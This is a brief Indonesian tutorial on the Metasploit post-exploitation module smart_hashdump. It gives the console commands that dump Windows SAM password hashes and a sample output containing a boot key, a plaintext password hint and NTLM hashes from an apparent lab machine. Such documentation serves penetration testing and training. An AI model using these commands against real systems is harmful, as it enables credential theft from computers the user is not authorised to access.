# smart_hashdump

Modul `smart_hashdump` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mengekstrak `hash password` dari `SAM` (Security Account Manager) database pada komputer target.

## Cara Penggunaan di Metasploit

```
use post/windows/gather/smart_hashdump
set SESSION <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Running module against ADMIN-PC
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /root/.msf4/loot/20250516134518_default_192.168.1.52_windows.hashes_110122.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] 	Obtaining the boot key...
[*] 	Calculating the hboot key using SYSKEY 719ee74fc86782fded26e05e9802b0c9...
[*] 	Obtaining the user list and keys...
[*] 	Decrypting user keys...
[*] 	Dumping password hints...
[+] 	admin:"10101010"
[*] 	Dumping password hashes...
[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] 	admin:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
[+] 	HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:afd92ce617b3210a7243ac63c8b3cf98:::
[*] Post module execution completed

```
